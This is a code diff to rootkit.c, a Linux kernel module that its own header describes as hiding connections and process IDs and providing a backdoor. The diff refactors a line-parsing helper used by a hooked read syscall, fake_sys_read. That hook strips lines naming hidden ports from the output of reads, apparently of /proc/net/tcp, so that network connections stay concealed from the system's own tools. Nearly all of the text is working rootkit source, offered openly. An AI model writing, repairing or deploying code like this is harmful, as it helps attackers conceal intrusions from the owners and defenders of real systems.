@@ -1,3 +1,14 @@
+/*
+ * \file        rootkit.c
+ * \brief       Implement a basic LKM.
+ * \author      Antoine.R
+ * \version     0.1
+ * \date        04/07/2018
+ *
+ * Implement A LKM with features : hide connection, hide pids, backdoor
+ *
+ */
+
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
@@ -206,28 +217,30 @@ static int create_hack_file(void)
 }
 
 // Extract line from a buffer
-static char * extract_line(void * buf, char * line)
+static char * extract_line(const char * buf, char * line, size_t count)
 {
     char * 	tok = NULL;
-    char * 	p = (char *)buf;
     size_t  len = 0;
 
-    if(!buf)
+    if(!buf || !line)
         return NULL;
 
-    tok = strsep(&p, "\n");
-    len = strlen(tok);
-
-    if(!tok || !len)
+    tok = strstr(buf, "\n");
+    if(!tok)
+        return NULL;
+    if((len = (tok - buf)) == 0)
         return NULL;
 
-    if(len > MAX_LINE_LEN)
+    if(len >= count)
         return NULL;
 
-    memcpy(line, tok, len);
+    memcpy(line, buf, len);
     memcpy(line + len, "\0", 1);
 
-    return p;
+    if(*(tok + 1) == '\0')
+        return NULL;
+
+    return (tok + 1);
 }
 
 // Extract local addr from /proc/net/tcp file
@@ -356,7 +369,7 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     int     i = 0, j = 0, skip = 0;
     ssize_t ret     = 0;
     char *  p       = (char *)buf;
-    char *  tok     = NULL;
+    char    line[MAX_LINE_LEN] = {0};
     char *  tmp     = kmalloc(count, GFP_KERNEL);
     size_t  offset  = 0;
     pid_t   pid     = original_sys_getpid();
@@ -375,13 +388,11 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
         return ret;
 
     //lets just print tmp for now
-    while((tok = strsep(&p, "\n")) != NULL)
+    while((p = extract_line(p, line, MAX_LINE_LEN)) != NULL)
     {
-        if(strlen(tok) == 0)
-            continue;
         for(j = 0; j < hidden_port_size; j++)
         {
-            if(strstr(tok, hidden_port[0]))
+            if(strstr(line, hidden_port[0]))
             {
                 skip = 1;
                 break;
@@ -393,8 +404,8 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
             continue;
         }
 
-        memcpy(tmp + offset, tok, strlen(tok));
-        offset += strlen(tok);
+        memcpy(tmp + offset, line, strlen(line));
+        offset += strlen(line);
         memcpy(tmp + offset, "\n", 1);
         offset++;
     }
